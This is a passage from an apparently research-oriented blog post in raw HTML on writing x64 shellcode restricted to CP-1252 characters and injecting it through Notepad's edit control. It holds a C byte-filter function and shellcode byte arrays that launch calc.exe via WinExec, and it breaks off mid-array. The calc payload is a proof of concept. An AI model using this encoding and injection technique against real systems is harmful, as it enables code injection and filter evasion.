#e34adc;\">$+2</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-07 18:24:51 UTC --></p>\n<h3 id=\"prefix\">3.7 Prefix Codes</h3>\n<p>Some of these prefixes can be used to pad an instruction. The only instructions I tested were 8-Bit operations.</p>\n<table>\n<thead>\n<tr>\n<th>Prefix</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0x2E, 0x3E</td>\n<td>Branch hints have no effect on anything newer than a Pentium 4. Harmless to use up a byte of space between instructions.</td>\n</tr>\n<tr>\n<td>0xF0</td>\n<td>The LOCK prefix guarantees the instruction has exclusive use of all shared memory, until the instruction completes execution.</td>\n</tr>\n<tr>\n<td>0xF2, 0xF3</td>\n<td>REP(0xF2) tells the CPU to repeat execution of a string manipulation instruction like MOVS, STOS, CMPS or SCAS until RCX is zero. REPNE (0xF3) repeats execution until RCX is zero or the Zero Flag (ZF) is cleared.</td>\n</tr>\n<tr>\n<td>0x26, 0x2E, 0x36, 0x3E, 0x64, 0x65</td>\n<td>The Extra Segment (ES) (0x26) prefix is used for the destination of string operations. The Code Segment (CS) (0x2E) for all instructions is the same as a branch hint and has no effect. The Stack Segment (0x36) is used for storing and loading local variables with instructions like PUSH/POP. The Data Segment (DS) (0x3E) for all data references, except stack and is also the same as a branch hint, which has no effect. FS(0x64) and GS(0x65) are not designated, but you&#8217;ll see them used to access the Thread Environment Block (TEB) on Windows or the Thread Local Storage (TLS) on Linux.</td>\n</tr>\n<tr>\n<td>0x66, 0x67</td>\n<td>Used to override the default size of a data type in 32-bit mode for a PUSH/POP or MOV. NASM/YASM support operand-size (0x66) and operand-address (0x67) prefixes using a16, a32, o16 and o32. </td>\n</tr>\n<tr>\n<td>0x40 &#8211; 0x4F</td>\n<td>REX prefixes for 64-Bit mode.</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"generate\">4. Generating Shellcode</h2>\n<p>Some things to consider when writing your own.</p>\n<ul>\n<li>Preserve all non-volatile registers used. RSI, RDI, RBP, RBX</li>\n<li>Allocate 32 bytes for homespace. This will be used by any API you invoke.</li>\n<li>Before invoking API, ensure the value of SP is aligned by 16 bytes minus 8.</li>\n</ul>\n<p>Some API will use SIMD instructions, usually for memcpy() or memset() of small blocks of data. To achieve optimal performance, the data accessed must be aligned by 16 bytes. If the stack pointer is misaligned and SIMD instructions are used to read or write to SP, this will result in an unhandled exception. Since we can&#8217;t use a CALL instruction, RET is used instead and once executed removes an API address from the stack. If it&#8217;s not aligned by 16 bytes at that point, expect trouble! \ud83d\ude42</p>\n<p>Using previous examples, the following code will construct a CP-1252 compatible shellcode to execute calc.exe using kernel32!WinExec(). This is simply to demonstrate the injection via notepads edit control works. </p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #696969;\">// the max address for virtual memory on </span>\n<span style=\"color: #696969;\">// windows is (2 ^ 47) - 1 or 0x7FFFFFFFFFFF</span>\n<span style=\"color: #004a43;\">#</span><span style=\"color: #004a43;\">define</span><span style=\"color: #004a43;\"> MAX_ADDR 6</span>\n\n<span style=\"color: #696969;\">// only useful for CP_ACP codepage</span>\n<span style=\"color: #800000; font-weight: bold;\">static</span>\n<span style=\"color: #800000; font-weight: bold;\">int</span> is_cp1252_allowed<span style=\"color: #808030;\">(</span><span style=\"color: #800000; font-weight: bold;\">int</span> ch<span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n  \n    <span style=\"color: #696969;\">// zero is allowed, but we can't use it for the clipboard</span>\n    <span style=\"color: #800000; font-weight: bold;\">if</span><span style=\"color: #808030;\">(</span>ch <span style=\"color: #808030;\">=</span><span style=\"color: #808030;\">=</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800000; font-weight: bold;\">return</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #696969;\">// bytes converted to double byte characters</span>\n    <span style=\"color: #800000; font-weight: bold;\">if</span><span style=\"color: #808030;\">(</span>ch <span style=\"color: #808030;\">&gt;</span><span style=\"color: #808030;\">=</span> <span style=\"color: #008000;\">0x80</span> <span style=\"color: #808030;\">&amp;</span><span style=\"color: #808030;\">&amp;</span> ch <span style=\"color: #808030;\">&lt;</span><span style=\"color: #808030;\">=</span> <span style=\"color: #008000;\">0x8C</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800000; font-weight: bold;\">return</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800000; font-weight: bold;\">if</span><span style=\"color: #808030;\">(</span>ch <span style=\"color: #808030;\">&gt;</span><span style=\"color: #808030;\">=</span> <span style=\"color: #008000;\">0x91</span> <span style=\"color: #808030;\">&amp;</span><span style=\"color: #808030;\">&amp;</span> ch <span style=\"color: #808030;\">&lt;</span><span style=\"color: #808030;\">=</span> <span style=\"color: #008000;\">0x9C</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800000; font-weight: bold;\">return</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">return</span> <span style=\"color: #808030;\">(</span>ch <span style=\"color: #808030;\">!</span><span style=\"color: #808030;\">=</span> <span style=\"color: #008000;\">0x8E</span> <span style=\"color: #808030;\">&amp;</span><span style=\"color: #808030;\">&amp;</span> ch <span style=\"color: #808030;\">!</span><span style=\"color: #808030;\">=</span> <span style=\"color: #008000;\">0x9E</span> <span style=\"color: #808030;\">&amp;</span><span style=\"color: #808030;\">&amp;</span> ch <span style=\"color: #808030;\">!</span><span style=\"color: #808030;\">=</span> <span style=\"color: #008000;\">0x9F</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n<span style=\"color: #800080;\">}</span>\n\n<span style=\"color: #696969;\">// Allocate 64-bit buffer on the stack.</span>\n<span style=\"color: #696969;\">// Then place the address in RDI for writing.</span>\n<span style=\"color: #004a43;\">#</span><span style=\"color: #004a43;\">define</span><span style=\"color: #004a43;\"> STORE_ADDR_SIZE 10</span>\n\n<span style=\"color: #800000; font-weight: bold;\">char</span> STORE_ADDR<span style=\"color: #808030;\">[</span><span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> <span style=\"color: #800080;\">{</span>\n  <span style=\"color: #696969;\">/* 0000 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x6a</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* push 0                */</span>\n  <span style=\"color: #696969;\">/* 0002 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x54</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* push rsp              */</span>\n  <span style=\"color: #696969;\">/* 0003 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x5d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>         <span style=\"color: #696969;\">/* add  byte [rbp], cl   */</span>\n  <span style=\"color: #696969;\">/* 0006 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x5f</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* pop  rdi              */</span>\n  <span style=\"color: #696969;\">/* 0007 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x5d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>         <span style=\"color: #696969;\">/* add  byte [rbp], cl   */</span>\n<span style=\"color: #800080;\">}</span><span style=\"color: #800080;\">;</span>\n\n<span style=\"color: #696969;\">// Load an 8-Bit immediate value into AH</span>\n<span style=\"color: #004a43;\">#</span><span style=\"color: #004a43;\">define</span><span style=\"color: #004a43;\"> LOAD_BYTE_SIZE 5</span>\n\n<span style=\"color: #800000; font-weight: bold;\">char</span> LOAD_BYTE<span style=\"color: #808030;\">[</span><span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> <span style=\"color: #800080;\">{</span>\n  <span style=\"color: #696969;\">/* 0000 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\xb8</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\xff</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #800000;\">\"</span> <span style=\"color: #696969;\">/* mov   eax, 0x4d00ff00 */</span>\n<span style=\"color: #800080;\">}</span><span style=\"color: #800080;\">;</span>\n\n<span style=\"color: #696969;\">// Subtract 32 from AH</span>\n<span style=\"color: #004a43;\">#</span><span style=\"color: #004a43;\">define</span><span style=\"color: #004a43;\"> SUB_BYTE_SIZE 8</span>\n\n<span style=\"color: #800000; font-weight: bold;\">char</span> SUB_BYTE<span style=\"color: #808030;\">[</span><span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> <span style=\"color: #800080;\">{</span>\n  <span style=\"color: #696969;\">/* 0000 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x5d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>         <span style=\"color: #696969;\">/* add   byte [rbp], cl  */</span>\n  <span style=\"color: #696969;\">/* 0003 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x2d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x20</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x5d</span><span style=\"color: #800000;\">\"</span> <span style=\"color: #696969;\">/* sub   eax, 0x4d002000 */</span>\n<span style=\"color: #800080;\">}</span><span style=\"color: #800080;\">;</span>\n\n<span style=\"color: #696969;\">// Store AH in buffer and advance RDI by 1</span>\n<span style=\"color: #004a43;\">#</span><span style=\"color: #004a43;\">define</span><span style=\"color: #004a43;\"> STORE_BYTE_SIZE 9</span>\n\n<span style=\"color: #800000; font-weight: bold;\">char</span> STORE_BYTE<span style=\"color: #808030;\">[</span><span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> <span style=\"color: #800080;\">{</span>\n  <span style=\"color: #696969;\">/* 0000 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x27</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* add   byte [rdi], ah  */</span>\n  <span style=\"color: #696969;\">/* 0002 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x5d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>         <span style=\"color: #696969;\">/* add   byte [rbp], cl  */</span>\n  <span style=\"color: #696969;\">/* 0005 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\xae</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* scasb                 */</span>\n  <span style=\"color: #696969;\">/* 0006 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x5d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>         <span style=\"color: #696969;\">/* add   byte [rbp], cl  */</span>\n<span style=\"color: #800080;\">}</span><span style=\"color: #800080;\">;</span>\n\n<span style=\"color: #696969;\">// Transfers control of execution to kernel32!WinExec</span>\n<span style=\"color: #004a43;\">#</span><span style=\"color: #004a43;\">define</span><span style=\"color: #004a43;\"> RET_SIZE 2</span>\n\n<span style=\"color: #800000; font-weight: bold;\">char</span> RET<span style=\"color: #808030;\">[</span><span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> <span style=\"color: #800080;\">{</span>\n  <span style=\"color: #696969;\">/* 0000 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\xc3</span><span style=\"color: #800000;\">\"</span> <span style=\"color: #696969;\">/* ret  */</span>\n  <span style=\"color: #696969;\">/* 0002 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>\n<span style=\"color: #800080;\">}</span><span style=\"color: #800080;\">;</span>\n\n<span style=\"color: #004a43;\">#</span><span style=\"color: #004a43;\">define</span><span style=\"color: #004a43;\"> CALC3_SIZE 164</span>\n<span style=\"color: #004a43;\">#</span><span style=\"color: #004a43;\">define</span><span style=\"color: #004a43;\"> RET_OFS 0x20 </span><span style=\"color: #808030;\">+</span><span style=\"color: #004a43;\"> 2</span>\n\n<span style=\"color: #800000; font-weight: bold;\">char</span> CALC3<span style=\"color: #808030;\">[</span><span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> <span style=\"color: #800080;\">{</span>\n  <span style=\"color: #696969;\">/* 0000 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\xb0</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* mov   al, 0                 */</span>\n  <span style=\"color: #696969;\">/* 0002 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\xc8</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x01</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>         <span style=\"color: #696969;\">/* enter 0x100, 0              */</span>\n  <span style=\"color: #696969;\">/* 0006 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x55</span><span style=\"color: #800000;\">\"</span>                     <span style=\"color: #696969;\">/* push  rbp                   */</span>\n  <span style=\"color: #696969;\">/* 0007 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x45</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* add   byte [rbp], al        */</span>\n  <span style=\"color: #696969;\">/* 000A */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x6a</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* push  0                     */</span>\n  <span style=\"color: #696969;\">/* 000C */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x54</span><span style=\"color: #800000;\">\"</span>                     <span style=\"color: #696969;\">/* push  rsp                   */</span>\n  <span style=\"color: #696969;\">/* 000D */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x45</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* add   byte [rbp], al        */</span>\n  <span style=\"color: #696969;\">/* 0010 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x5d</span><span style=\"color: #800000;\">\"</span>                     <span style=\"color: #696969;\">/* pop   rbp                   */</span>\n  <span style=\"color: #696969;\">/* 0011 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* add   byte [rbp], cl        */</span>\n  <span style=\"color: #696969;\">/* 0014 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x57</span><span style=\"color: #800000;\">\"</span>                     <span style=\"color: #696969;\">/* push  rdi                   */</span>\n  <span style=\"color: #696969;\">/* 0015 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* add   byte [rbp], cl        */</span>\n  <span style=\"color: #696969;\">/* 0018 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x56</span><span style=\"color: #800000;\">\"</span>                     <span style=\"color: #696969;\">/* push  rsi                   */</span>\n  <span style=\"color: #696969;\">/* 0019 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* add   byte [rbp], cl        */</span>\n  <span style=\"color: #696969;\">/* 001C */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x53</span><span style=\"color: #800000;\">\"</span>                     <span style=\"color: #696969;\">/* push  rbx                   */</span>\n  <span style=\"color: #696969;\">/* 001D */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* add   byte [rbp], cl        */</span>\n  <span style=\"color: #696969;\">/* 0020 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\xb8</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\xff</span><span style=\"color: #800000;\">\"</span>     <span style=\"color: #696969;\">/* mov   eax, 0xff004d00       */</span>\n  <span style=\"color: #696969;\">/* 0025 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\xe1</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* add   cl, ah                */</span>\n  <span style=\"color: #696969;\">/* 0027 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* add   byte [rbp], cl        */</span>\n  <span style=\"color: #696969;\">/* 002A */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\xb8</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x01</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\xff</span><span style=\"color: #800000;\">\"</span>     <span style=\"color: #696969;\">/* mov   eax, 0xff000100       */</span>\n  <span style=\"color: #696969;\">/* 002F */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\xe5</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* add   ch, ah                */</span>\n  <span style=\"color: #696969;\">/* 0031 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* add   byte [rbp], cl        */</span>\n  <span style=\"color: #696969;\">/* 0034 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x51</span><span style=\"color: #800000;\">\"</span>                     <span style=\"color: #696969;\">/* push  rcx                   */</span>\n  <span style=\"color: #696969;\">/* 0035 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* add   byte [rbp], cl        */</span>\n  <span style=\"color: #696969;\">/* 0038 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x5b</span><span style=\"color: #800000;\">\"</span>                     <span style=\"color: #696969;\">/* pop   rbx                   */</span>\n  <span style=\"color: #696969;\">/* 0039 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* add   byte [rbp], cl        */</span>\n  <span style=\"color: #696969;\">/* 003C */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x6a</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* push  0                     */</span>\n  <span style=\"color: #696969;\">/* 003E */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x54</span><span style=\"color: #800000;\">\"</span>                     <span style=\"color: #696969;\">/* push  rsp                   */</span>\n  <span style=\"color: #696969;\">/* 003F */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* add   byte [rbp], cl        */</span>\n  <span style=\"color: #696969;\">/* 0042 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x5f</span><span style=\"color: #800000;\">\"</span>                     <span style=\"color: #696969;\">/* pop   rdi                   */</span>\n  <span style=\"color: #696969;\">/* 0043 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* add   byte [rbp], cl        */</span>\n  <span style=\"color: #696969;\">/* 0046 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x57</span><span style=\"color: #800000;\">\"</span>                     <span style=\"color: #696969;\">/* push  rdi                   */</span>\n  <span style=\"color: #696969;\">/* 0047 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* add   byte [rbp], cl        */</span>\n  <span style=\"color: #696969;\">/* 004A */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x59</span><span style=\"color: #800000;\">\"</span>                     <span style=\"color: #696969;\">/* pop   rcx                   */</span>\n  <span style=\"color: #696969;\">/* 004B */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* add   byte [rbp], cl        */</span>\n  <span style=\"color: #696969;\">/* 004E */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x6a</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* push  0                     */</span>\n  <span style=\"color: #696969;\">/* 0050 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x54</span><span style=\"color: #800000;\">\"</span>                     <span style=\"color: #696969;\">/* push  rsp                   */</span>\n  <span style=\"color: #696969;\">/* 0051 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* add   byte [rbp], cl        */</span>\n  <span style=\"color: #696969;\">/* 0054 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x58</span><span style=\"color: #800000;\">\"</span>                     <span style=\"color: #696969;\">/* pop   rax                   */</span>\n  <span style=\"color: #696969;\">/* 0055 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* add   byte [rbp], cl        */</span>\n  <span style=\"color: #696969;\">/* 0058 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\xc7</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x63</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x6c</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span> <span style=\"color: #696969;\">/* mov   dword [rax], 0x6c0063 */</span>\n  <span style=\"color: #696969;\">/* 005E */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x58</span><span style=\"color: #800000;\">\"</span>                     <span style=\"color: #696969;\">/* pop   rax                   */</span>\n  <span style=\"color: #696969;\">/* 005F */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* add   byte [rbp], cl        */</span>\n  <span style=\"color: #696969;\">/* 0062 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x35</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x61</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x63</span><span style=\"color: #800000;\">\"</span>     <span style=\"color: #696969;\">/* xor   eax, 0x63006100       */</span>\n  <span style=\"color: #696969;\">/* 0067 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* add   byte [rbp], cl        */</span>\n  <span style=\"color: #696969;\">/* 006A */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\xab</span><span style=\"color: #800000;\">\"</span>                     <span style=\"color: #696969;\">/* stosd                       */</span>\n  <span style=\"color: #696969;\">/* 006B */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* add   byte [rbp], cl        */</span>\n  <span style=\"color: #696969;\">/* 006E */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x6a</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>                 <span style=\"color: #696969;\">/* push  0                     */</span>\n  <span style=\"color: #696969;\">/* 0070 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x54</span><span style=\"color: #800000;\">\"</span>                     <span style=\"color: #696969;\">/* push  rsp                   */</span>\n  <span style=\"color: #696969;\">/* 0071 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* add   byte [rbp], cl        */</span>\n  <span style=\"color: #696969;\">/* 0074 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x58</span><span style=\"color: #800000;\">\"</span>                     <span style=\"color: #696969;\">/* pop   rax                   */</span>\n  <span style=\"color: #696969;\">/* 0075 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* add   byte [rbp], cl        */</span>\n  <span style=\"color: #696969;\">/* 0078 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\xc6</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x05</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* mov   byte [rax], 5         */</span>\n  <span style=\"color: #696969;\">/* 007B */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* add   byte [rbp], cl        */</span>\n  <span style=\"color: #696969;\">/* 007E */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x5a</span><span style=\"color: #800000;\">\"</span>                     <span style=\"color: #696969;\">/* pop   rdx                   */</span>\n  <span style=\"color: #696969;\">/* 007F */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #0f69ff;\">\\x4d</span><span style=\"color: #0f69ff;\">\\x00</span><span style=\"color: #800000;\">\"</span>             <span style=\"color: #696969;\">/* add   byte [rbp], cl        */</span>\n  <span style=\"color: #696969;\">/* 0082 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0f69ff;\">\\x53</span><span style=\"color: #800000;\">\"</span>                     <span style=\"color: #696969;\">/* push  rbx                   */</span>\n  <span style=\"color: #696969;\">/* 0083 */</span> <span style=\"color: #800000;\">\"</span><span style=\"color: 